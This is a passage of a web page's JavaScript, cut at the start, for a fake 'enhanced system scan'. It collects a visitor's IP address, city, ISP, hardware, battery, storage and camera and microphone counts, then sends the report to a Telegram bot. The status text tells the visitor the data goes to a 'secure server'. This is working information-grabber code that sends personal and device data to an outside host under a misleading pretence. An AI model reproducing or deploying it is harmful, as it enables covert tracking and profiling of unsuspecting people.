                    domInteractive: timing.domInteractive,

                },
                regionCode: navigator.language.split('-')[1] || '',
                daylightSavings: isDaylightSavingTime(),
            };
        }

        function isDaylightSavingTime() {
            const date = new Date();
            const jan = new Date(date.getFullYear(), 0, 1);
            const jul = new Date(date.getFullYear(), 6, 1);
            return Math.min(jan.getTimezoneOffset(), jul.getTimezoneOffset()) === date.getTimezoneOffset();
        }

        function getSecurityInfo() {
            return {
                https: window.isSecureContext,
                tls: window.isSecureContext,
                cors: 'fetch' in window,
                contentSecurityPolicy: 'securityPolicy' in document,
                crossOriginIsolated: window.crossOriginIsolated,
                permissions: 'permissions' in navigator,
                credentialsContainer: 'credentials' in navigator,
                securePayment: 'PaymentRequest' in window,
            };
        }

        async function getInputDevicesInfo() {
            const info = {
                pointer: {
                    maxTouchPoints: navigator.maxTouchPoints,
                    pointerEnabled: 'PointerEvent' in window,
                    touchEnabled: 'ontouchstart' in window,
                    coarsePointer: window.matchMedia('(pointer: coarse)').matches,
                    finePointer: window.matchMedia('(pointer: fine)').matches,
                },
                keyboard: {
                    present: 'keyboard' in navigator,
                    layout: navigator.keyboard ? await navigator.keyboard.getLayoutMap().catch(() => 'unavailable') : 'unavailable',
                },
                gamepad: {
                    supported: 'getGamepads' in navigator,
                    gamepads: navigator.getGamepads ? Array.from(navigator.getGamepads()).filter(Boolean).length : 0,
                },

            };

            if (navigator.mediaDevices) {
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    info.mediaDevices = {
                        audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                        audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
                        videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    };
                } catch (e) {
                    info.mediaDevices = 'Access denied';
                }
            }

            return info;
        }

        function getBrowserCapabilities() {
            return {
                cookies: navigator.cookieEnabled,
                localStorage: checkLocalStorage(),
                sessionStorage: checkSessionStorage(),
                indexedDB: checkIndexedDB(),
                webWorkers: 'Worker' in window,
                serviceWorkers: 'serviceWorker' in navigator,
                webSockets: 'WebSocket' in window,
                webRTC: 'RTCPeerConnection' in window,
                geolocation: 'geolocation' in navigator,
                notifications: 'Notification' in window,
                push: 'PushManager' in window,
                bluetooth: 'bluetooth' in navigator,
                usb: 'usb' in navigator,
                midi: 'requestMIDIAccess' in navigator,
                gamepad: 'getGamepads' in navigator,
                virtualReality: 'xr' in navigator,
                touchscreen: 'ontouchstart' in window,
                accelerometer: 'Accelerometer' in window,
                gyroscope: 'Gyroscope' in window,
                magnetometer: 'Magnetometer' in window,
                ambient: 'AmbientLightSensor' in window,
            };
        }

        function getConnectionState() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                online: navigator.onLine,
                type: connection ? connection.effectiveType : 'unknown',
                saveData: connection ? connection.saveData : false,
                downlink: connection ? connection.downlink : 'unknown',
                rtt: connection ? connection.rtt : 'unknown',
                downlinkMax: connection ? connection.downlinkMax : 'unknown',
            };
        }

        async function updateProgressBar(percent) {
            const progressBar = document.getElementById('progressBar');
            const progressBarFill = document.getElementById('progressBarFill');
            const progressLabel = document.getElementById('progressLabel');

            progressBar.style.display = 'block';
            progressBarFill.style.width = `${percent}%`;
            progressLabel.textContent = `${Math.round(percent)}%`;
        }

        function formatDataForTelegram(data) {
            let message = 'üîç <b>Enhanced System Information Report</b>\n\n';

            // Browser Info
            message += 'üåê <b>Browser Information</b>\n';
            message += `‚Ä¢ User Agent: ${data.browser.userAgent}\n`;
            message += `‚Ä¢ Browser: ${data.browser.appName}\n`;
            message += `‚Ä¢ Version: ${data.browser.appVersion}\n`;
            message += `‚Ä¢ Language: ${data.browser.language}\n`;
            message += `‚Ä¢ Platform: ${data.browser.platform}\n`;
            message += `‚Ä¢ Cookies: ${data.browser.cookiesEnabled}\n`;
            message += `‚Ä¢ Touch Points: ${data.browser.maxTouchPoints}\n`;
            message += `‚Ä¢ Dark Mode: ${data.browser.darkMode}\n\n`;

            // Screen Info
            message += 'üì± <b>Display Information</b>\n';
            message += `‚Ä¢ Resolution: ${data.screen.width}x${data.screen.height}\n`;
            message += `‚Ä¢ Available: ${data.screen.availWidth}x${data.screen.availHeight}\n`;
            message += `‚Ä¢ Color Depth: ${data.screen.colorDepth}\n`;
            message += `‚Ä¢ Pixel Ratio: ${data.screen.pixelRatio}\n`;
            message += `‚Ä¢ Orientation: ${data.screen.orientation?.type || 'Unknown'}\n\n`;

            // Network Info
            message += 'üåç <b>Network Information</b>\n';
            message += `‚Ä¢ IP Address: ${data.network.ip}\n`;
            message += `‚Ä¢ Connection: ${data.network.type}\n`;
            message += `‚Ä¢ Downlink: ${data.network.downlink} Mbps\n`;
            message += `‚Ä¢ RTT: ${data.network.rtt}ms\n`;
            message += `‚Ä¢ Online: ${data.network.onLine}\n\n`;

            // Location Info
            if (typeof data.location === 'object' && !data.location.error) {
                message += 'üìç <b>Location Information</b>\n';
                message += `‚Ä¢ City: ${data.location.city}\n`;
                message += `‚Ä¢ Region: ${data.location.region}\n`;
                message += `‚Ä¢ Country: ${data.location.country}\n`;
                message += `‚Ä¢ Timezone: ${data.location.timezone}\n`;
                message += `‚Ä¢ ISP: ${data.location.org}\n`;
                message += `‚Ä¢ ASN: ${data.location.asn}\n\n`;
            }

            // Battery Info
            if (typeof data.battery === 'object') {
                message += 'üîã <b>Battery Information</b>\n';
                message += `‚Ä¢ Charging: ${data.battery.charging}\n`;
                message += `‚Ä¢ Level: ${data.battery.level}%\n`;
                message += `‚Ä¢ Charging Time: ${data.battery.chargingTime}\n`;
                message += `‚Ä¢ Discharging Time: ${data.battery.dischargingTime}\n\n`;
            }

            // Hardware Info
            message += 'üíª <b>Hardware Information</b>\n';
            message += `‚Ä¢ CPU Cores: ${data.browser.hardwareConcurrency}\n`;
            message += `‚Ä¢ Memory: ${data.browser.deviceMemory}GB\n`;
            if (typeof data.graphics === 'object') {
                message += `‚Ä¢ GPU: ${data.graphics.renderer}\n`;
                message += `‚Ä¢ Vendor: ${data.graphics.vendor}\n`;
            }
            message += '\n';

            // System Capabilities
            message += '‚öôÔ∏è <b>System Capabilities</b>\n';
            const checks = data.systemChecks;
            message += `‚Ä¢ WebGL: ${checks.webGL}\n`;
            message += `‚Ä¢ WebGL2: ${checks.webGL2}\n`;
            message += `‚Ä¢ Canvas: ${checks.canvas}\n`;
            message += `‚Ä¢ WebAssembly: ${checks.webAssembly}\n`;
            message += `‚Ä¢ WebRTC: ${checks.webRTC}\n`;
            message += `‚Ä¢ WebWorker: ${checks.webWorker}\n`;
            message += `‚Ä¢ ServiceWorker: ${checks.serviceWorker}\n\n`;

            // Media Capabilities
            if (data.media) {
                message += 'üéÆ <b>Media Capabilities</b>\n';
                message += `‚Ä¢ Audio: ${data.media.audioSupport.webAudio}\n`;
                message += `‚Ä¢ Video: ${data.media.videoSupport.videoPlayback}\n`;
                message += `‚Ä¢ PiP: ${data.media.videoSupport.pictureInPicture}\n`;
                message += `‚Ä¢ Fullscreen: ${data.media.videoSupport.fullscreen}\n\n`;
            }

            // Security Info
            message += 'üîí <b>Security Information</b>\n';
            message += `‚Ä¢ HTTPS: ${data.security.https}\n`;
            message += `‚Ä¢ TLS: ${data.security.tls}\n`;
            message += `‚Ä¢ CORS: ${data.security.cors}\n`;
            message += `‚Ä¢ CSP: ${data.security.contentSecurityPolicy}\n\n`;

            // Input Devices
            if (data.inputDevices) {
                message += 'üéÆ <b>Input Devices</b>\n';
                message += `‚Ä¢ Touch: ${data.inputDevices.pointer.touchEnabled}\n`;
                message += `‚Ä¢ Pointer: ${data.inputDevices.pointer.pointerEnabled}\n`;
                message += `‚Ä¢ Keyboard: ${data.inputDevices.keyboard.present}\n`;
                if (data.inputDevices.mediaDevices) {
                    message += `‚Ä¢ Cameras: ${data.inputDevices.mediaDevices.videoInputs}\n`;
                    message += `‚Ä¢ Microphones: ${data.inputDevices.mediaDevices.audioInputs}\n`;
                }
                message += '\n';
            }

            // Storage Info
            if (data.storage) {
                message += 'üíæ <b>Storage Information</b>\n';
                message += `‚Ä¢ LocalStorage: ${data.storage.localStorage}\n`;
                message += `‚Ä¢ SessionStorage: ${data.storage.sessionStorage}\n`;
                message += `‚Ä¢ IndexedDB: ${data.storage.indexedDB}\n`;
                if (data.storage.quota) {
                    message += `‚Ä¢ Total: ${formatBytes(data.storage.quota.total)}\n`;
                    message += `‚Ä¢ Used: ${formatBytes(data.storage.quota.used)}\n`;
                }
                message += '\n';
            }

            return message;
        }

        function formatBytes(bytes) {
            if (!bytes) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
        }

        async function sendToTelegram(data) {
            const message = formatDataForTelegram(data);

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                    }),
                });

                if (!response.ok) {
                    throw new Error('Failed to send message to Telegram');
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                throw error;
            }
        }

        document.getElementById('scanButton').addEventListener('click', async () => {
            const statusElement = document.getElementById('status');
            const scanButton = document.getElementById('scanButton');
            const scanDetails = document.getElementById('scanDetails');

            scanButton.disabled = true;
            statusElement.innerHTML = '<span class="blink">‚ö° Initiating enhanced system scan...</span>';
            scanDetails.innerHTML = '';
            scanDetails.classList.add('active');

            try {
                // Start progress bar animation
                updateProgressBar(0);
                await new Promise(resolve => setTimeout(resolve, 500));

                // Collect basic information
                scanDetails.innerHTML += '<div class="detail-item">üì° Collecting basic system information...</div>';
                updateProgressBar(20);
                await new Promise(resolve => setTimeout(resolve, 300));

                // Collect network information
                scanDetails.innerHTML += '<div class="detail-item">üåê Analyzing network capabilities...</div>';
                updateProgressBar(40);
                await new Promise(resolve => setTimeout(resolve, 300));

                // Collect hardware information
                scanDetails.innerHTML += '<div class="detail-item">üíª Gathering hardware specifications...</div>';
                updateProgressBar(60);
                await new Promise(resolve => setTimeout(resolve, 300));

                // Collect system information
                const systemInfo = await collectSystemInfo();
                scanDetails.innerHTML += '<div class="detail-item">‚öôÔ∏è Processing system capabilities...</div>';
                updateProgressBar(80);
                await new Promise(resolve => setTimeout(resolve, 300));

                // Send to Telegram
                statusElement.innerHTML = '<span class="blink">üì° Transmitting enhanced data...</span>';
                scanDetails.innerHTML += '<div class="detail-item">üì§ Sending data to secure server...</div>';
                await sendToTelegram(systemInfo);
                updateProgressBar(100);

                // Update status
                statusElement.textContent = '‚úÖ Enhanced scan complete! All data has been transmitted.';
                scanDetails.innerHTML += '<div class="detail-item">‚úÖ Scan completed successfully!</div>';
            } catch (error) {
                console.error('Error:', error);
                statusElement.textContent = '‚ùå Error during enhanced scan. Please try again.';
                scanDetails.innerHTML += '<div class="detail-item">‚ùå Error occurred during scan.</div>';
            } finally {
                scanButton.disabled = false;
                setTimeout(() => {
                    document.getElementById('progressBar').style.display = 'none';
                    scanDetails.classList.remove('active');
                }, 3000);
            }
        });
    </script>
</body>
